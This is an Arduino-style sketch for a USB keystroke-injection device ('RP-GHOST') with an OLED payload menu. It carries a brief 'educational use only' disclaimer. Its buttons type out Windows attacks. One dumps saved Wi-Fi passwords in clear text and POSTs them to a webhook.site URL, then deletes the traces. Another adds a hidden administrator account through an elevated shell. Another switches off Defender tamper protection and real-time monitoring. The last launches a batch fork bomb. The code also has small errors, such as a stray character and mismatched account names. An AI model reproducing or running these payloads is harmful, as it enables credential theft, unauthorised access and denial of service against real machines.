/*this code is developed by Athaf Atheeq . do noot use for illegal this tool has no lisence 
so that you have to use it only for educational purposes and do it on your own lab i am not 
misusing or try to hacking . thats all*/

#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Keyboard.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#define BTN1 10   
#define BTN2 11  
#define BTN3 8
#define BTN4 6
#define BTN5 3
#define BTN6 0


void showMessage(const char* msg) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_INVERSE);
  display.setCursor(0, 25);
  display.println(msg);
  display.display();
}

bool alreadyRun = false;

// -------- Typing speed control --------
void typeSlow(const char *text, int speedMs) {
  while (*text) {
    Keyboard.write(*text);
    delay(speedMs);
    text++;
  }
}


void bootScreen() {
  display.clearDisplay();
  display.setTextColor(SSD1306_INVERSE);

  display.setTextSize(2);
  display.setCursor(10, 0);
  display.println("RP-GHOST");

  display.setTextSize(1);
  display.setCursor(45, 20);
  display.println("ver-1.0");

  display.setCursor(0, 30);
  display.println("created by:");

  display.setCursor(0, 40);
  display.println("ALTHAF ATHEEQ [CEH]");

  display.setCursor(0, 50);s
  display.println("HACK THE WORLD");

  display.display();
  delay(5000);   // 🔹 NAME = 5 sec
}




void showPayloadsStatic() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_INVERSE);

display.setCursor(0, 0);
display.println("PAYLOADS////SCRIPTS");

display.setCursor(0, 9);
display.println("1: WIFI PASSWORD GRAB");

display.setCursor(0, 18);
display.println("2: no payload");

display.setCursor(0, 27);
display.println("3: no payload ");

display.setCursor(0, 36);
display.println("4: USER CREATE");

display.setCursor(0, 45);
display.println("5: PROTECTION OFF");

display.setCursor(0, 54);
display.println("6: WINDOWS CRASH");

display.setCursor(0, 63);
display.println("**********************");

  display.display();
}



void showExecuting(const char* name) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_INVERSE);
  display.setCursor(0, 20);
  display.println("Executing...");
  display.setCursor(0, 35);
  display.println(name);
  display.display();
  delay(1000); //  i sec delay
}



void setup() {
   
Wire.setSDA(28);
Wire.setSCL(29);
Wire.begin();


 Wire.begin();   // GPI28 SDA, GPI29 SCL

  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  Keyboard.begin();

  bootScreen();
  showPayloadsStatic();
 


  pinMode(BTN1, INPUT_PULLUP);
  pinMode(BTN2, INPUT_PULLUP);
  pinMode(BTN3, INPUT_PULLUP);
  pinMode(BTN4, INPUT_PULLUP);
  pinMode(BTN5, INPUT_PULLUP);
  pinMode(BTN6, INPUT_PULLUP);

  Keyboard.begin();
  delay(1500);   // USB recognize wait
}



void loop() {

  // -------- Button 1 pressed --------
  if (digitalRead(BTN1) == LOW) {//11111111111111111111111111111111111111111111111111111111111111111111111
showExecuting("WIFI PASSWORD GRAB !");
    // Win + R
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(120);
    Keyboard.releaseAll();
    delay(600);

    typeSlow("cmd", 10);
    Keyboard.write(KEY_RETURN);

    delay(1000);

    typeSlow("cd %temp%", 10);
    Keyboard.write(KEY_RETURN);

    delay(200);

    typeSlow("netsh wlan export profile key=clear", 10);
    Keyboard.write(KEY_RETURN);

    delay(200);

    typeSlow("Powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS", 10);
    Keyboard.write(KEY_RETURN);

    delay(200);

    typeSlow("Powershell Invoke-WebRequest -Uri https://webhook.site/e677ce3e-87bc-4744-85ef-ab9fc34c2767 -Method POST -InFile Wi-Fi-PASS", 10);
    Keyboard.write(KEY_RETURN);

    delay(200);

    typeSlow("Del Wi-* /s /f /q", 10);
    Keyboard.write(KEY_RETURN);

    delay(200);

    typeSlow("exit", 10);
    Keyboard.write(KEY_RETURN);

    delay(200);

    alreadyRun = true;   // run once

     showPayloadsStatic();

  while (digitalRead(BTN1) == LOW); // wait until button release
  delay(300);

  }

   
  
  
  if (digitalRead(BTN2) == LOW) {//22222222222222222222222222222222222222222222222222222222222222222222222222222
   
    
    showExecuting("no payload selected !");

      showPayloadsStatic();

  while (digitalRead(BTN2) == LOW); // wait until button release
  delay(300);
  }

  if (digitalRead(BTN3) == LOW) {//333333333333333333333333333333333333333333333333333333333333333333333333333333
  
    showExecuting("no payload selected !");

         showPayloadsStatic();

  while (digitalRead(BTN3) == LOW); // wait until button release
  delay(300);
  }

  if (digitalRead(BTN4) == LOW) { //44444444444444444444444444444444444444444444444444444444444444444444444444444
  
  showExecuting("USER CREATION !");
     Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_ESC);
    delay(120);
    Keyboard.releaseAll();
    delay(1000);

    typeSlow("cmd", 10);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.write(KEY_RETURN);
    delay(1000);

    typeSlow("cmd /k powershell Start-Process cmd -Verb runAs", 10);
    Keyboard.releaseAll();
    delay(200);
    Keyboard.write(KEY_RETURN);
    delay(2000);


Keyboard.press(KEY_LEFT_ARROW);
delay(100);
Keyboard.release(KEY_LEFT_ARROW);
delay(200);
Keyboard.write(KEY_RETURN);
delay(2000);

    typeSlow("net user anonymouss anonymous999 /add && net localgroup administrators anonymous /add", 10);
    Keyboard.releaseAll();
    delay(200);
    Keyboard.write(KEY_RETURN);
    delay(1000);


   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);        
   delay(100);
   Keyboard.releaseAll(); 

   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('d');        
   delay(100);
   Keyboard.releaseAll();

        showPayloadsStatic();

  while (digitalRead(BTN4) == LOW); // wait until button release
  delay(300);
    
  }

  if (digitalRead(BTN5) == LOW) {//555555555555555555555555555555555555555555555555555555555555555555555555555555

    showExecuting("PROTECTION OFF !");

     Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('s');
    delay(120);
    Keyboard.releaseAll();
    delay(2000);
   
   // turn off temper protection-----------------------------------------------------------------

    typeSlow("Tamper Protection", 10);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.write(KEY_RETURN);
    delay(500);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_LEFT_ARROW);
delay(100);
Keyboard.release(KEY_LEFT_ARROW);
delay(200);


Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

    Keyboard.press(KEY_RIGHT_ARROW);
    delay(50);
    Keyboard.release(KEY_RIGHT_ARROW);
    delay(200);

Keyboard.write(' ');
delay(2000);


    Keyboard.press(KEY_LEFT_ARROW);
    delay(200);
    Keyboard.release(KEY_LEFT_ARROW);

    Keyboard.write(KEY_RETURN);
    delay(1000);

   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);        
   delay(100);
   Keyboard.releaseAll();         


   // Turns off Real Time Monitoring.--------------------------------------------------------------------

 
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('s');
    delay(50);
    Keyboard.releaseAll();
    delay(2000);

    typeSlow("Tamper Protection", 10);
    Keyboard.write(KEY_RETURN);
    delay(2000);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);


    Keyboard.press(KEY_LEFT_ARROW);
    delay(50);
    Keyboard.release(KEY_LEFT_ARROW);

    
Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_DOWN_ARROW);
delay(100);
Keyboard.release(KEY_DOWN_ARROW);
delay(200);

Keyboard.press(KEY_RIGHT_ARROW);
delay(100);
Keyboard.release(KEY_RIGHT_ARROW);
delay(200);

Keyboard.write(' ');
delay(2000); 

    Keyboard.press(KEY_LEFT_ARROW);
    delay(50);
    Keyboard.release(KEY_LEFT_ARROW);


    Keyboard.write(KEY_RETURN);
    delay(500);

    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);        
    delay(100);
    Keyboard.releaseAll();

     showPayloadsStatic();

  while (digitalRead(BTN5) == LOW); // wait until button release
  delay(300);
 
  }
  //this code is used for crashing windows (opening loop cmd)-----------------------------------------------------

  if (digitalRead(BTN6) == LOW) {//66666666666666666666666666666666666666666666666666666666666666666666666666666

    showExecuting("WINDOWS CRASH !");

     Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(120);
    Keyboard.releaseAll();
    delay(600);

    typeSlow("cmd", 10);
    Keyboard.write(KEY_RETURN);

    delay(1000);
    
    typeSlow("(echo :ouch && echo start ouch.bat && echo goto ouch) > %temp%/ouch.bat", 10);
    Keyboard.write(KEY_RETURN);

    delay(500);

    typeSlow("cd %temp% && ouch.bat", 10);
    Keyboard.write(KEY_RETURN);

         showPayloadsStatic();

  while (digitalRead(BTN6) == LOW); // wait until button release
  delay(300);
    



  }

}